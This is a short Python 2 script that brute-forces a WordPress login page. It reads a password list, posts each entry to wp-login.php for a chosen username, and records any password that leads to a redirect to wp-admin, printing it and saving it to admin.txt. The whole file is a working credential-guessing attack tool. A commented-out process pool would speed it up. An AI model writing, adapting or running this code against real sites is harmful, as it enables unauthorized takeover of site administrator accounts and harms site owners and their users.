import requests
from multiprocessing import Pool
global site
global user
site=""
user=""
f= open("admin.txt",'w')

#
def brute(pwd):
	r = requests.post(site, data={'log': user, 'pwd': pwd})
	if ("wp-admin" in r.url):
		f.write("pass is:"+str(pwd))
		print "---------------------------found login cred-------------------\npass: "+ str(pwd)+"\n----------------------------------\n"
	return r.url
	#print 'here'



if __name__ == '__main__':
	site= raw_input("Site address with directory.Example: http://localhost/wordpress/wp-login.php\n")
	#print site
	#site= "http://localhost/wordpress/wp-login.php"
	user= raw_input("Username:\n")
	#user="admin"
	fname= raw_input("Name of the password list: (Example: pwd.txt)\n")
	file= open(fname,"r")
	lines= file.read().splitlines()
	for line in lines:
		brute(line)
	# p = Pool(5)
	# p.map(brute, lines)

    